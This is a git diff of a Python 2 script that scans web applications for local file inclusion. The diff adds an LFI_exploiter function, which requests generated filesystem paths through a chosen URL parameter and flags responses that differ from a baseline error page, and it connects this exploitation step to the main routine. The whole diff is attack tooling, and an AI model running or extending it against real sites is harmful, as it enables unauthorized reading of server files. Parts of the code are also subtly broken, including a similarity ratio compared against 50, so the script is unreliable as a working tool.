@@ -2,7 +2,14 @@ from difflib import SequenceMatcher
 import os, argparse, sys, random, requests
 
 def Print(something):
-    print ("[*] {}".format(something))
+    split = something.split("\n")
+    if len(split) > 1:
+        Print("")
+        for each in split[1:]:
+            print "    {}".format(each)
+          
+    else:
+        print "[*] {}".format(something)
 
 def generatePaths(Max = None):
     paths = []
@@ -70,12 +77,13 @@ def Banner():
     print banner
 
 def LFI_error_tester(url, tests, tolerance):
-    # ASSUME THAT URL IS IN THE FORM OF: http://host:port/
+    # ASSUME THAT URL IS IN THE FORM OF: http://host:port/index.php?value=filepath
     
     error = []
     validity = 0
+
     for i in xrange(len(tests)):
-        content = requests.get(url+tests[i]).content
+        content = requests.get(url+tests[i]).content.strip()
         error.append(content)
 
     best = []
@@ -84,12 +92,36 @@ def LFI_error_tester(url, tests, tolerance):
         validity = 0
         for j in error:
             if SequenceMatcher(None, i, j).ratio() > tolerance:
-                validity += 1
-        best.append((i, validity))
+                validity += SequenceMatcher(None, i, j).ratio()
+        best.append((i, validity/len(tests)))
 
     max_score = max([n[1] for n in best])
     error = [i for i in best if i[1] == max_score][0][0]
     return error
+
+def LFI_exploiter(url, error, paths):
+
+    matches = 0
+
+    try:
+        for i in paths:
+            content = requests.get(url+i).content.strip()
+            if SequenceMatcher(None, content, error).ratio() < 50:
+                Print("==> Match found with {}".format(url+i))
+                matches += 1
+    
+    except KeyboardInterrupt:
+        print "\r[*] Aborting, {} matches found.".format(matches)
+        return 1
+
+def urlparse(url, value):
+    base = url.split("?")[0]
+    params = url.split("?")[-1].split("&")
+    for i in params:
+        if i.split("=")[0] == value:
+            params.append(params.pop(params.index(i)))
+            
+    return base + "?" + "=".join("&".join(params).split("=")[:-1])+"="
 
 def getRubbish(attempts = 10):
 
@@ -148,7 +180,7 @@ if __name__ == "__main__":
 
         Print("Generating file paths from filesystem...")
 
-        generateFiles(maxPaths)
+        paths = generateFiles(maxPaths)
 
         Print("Number of file paths generated: {}.".format(maxPaths))
         
@@ -158,9 +190,16 @@ if __name__ == "__main__":
 
         tests = getRubbish()
         tolerance = 0.75
+        value = "file" # rewrite so that it's in arguments
+
+        url = urlparse(url, value) # rearranges url so that fuzzed parameter is last & empty
+
         error = LFI_error_tester(url, tests, tolerance)
 
         Print("Error message detected, lenght = {}.".format(len(error)))
+        #Print(error)
+        Print("Starting exploitation...")
+        LFI_exploiter(url, error, paths)
 
     if args.__dict__["out_file"] != "": 
 
